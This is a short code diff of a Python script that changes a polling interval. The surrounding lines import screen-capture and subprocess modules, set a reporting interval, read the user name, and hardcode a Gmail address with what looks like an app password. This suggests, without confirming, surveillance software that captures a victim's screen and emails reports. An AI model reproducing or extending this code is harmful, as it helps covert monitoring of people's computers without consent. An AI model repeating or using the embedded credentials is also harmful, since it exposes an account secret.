@@ -24,7 +24,7 @@ import subprocess
 from PIL import ImageGrab
 
 REPORT_INTERVAL = 20
-POLLING_INTERVAL = 10
+POLLING_INTERVAL = 30
 EMAIL = "ilove6841verymuch@gmail.com"
 EMAIL_PASSWORD = "vyeg mhds cgge shmo"
 USER_NAME = getpass.getuser()
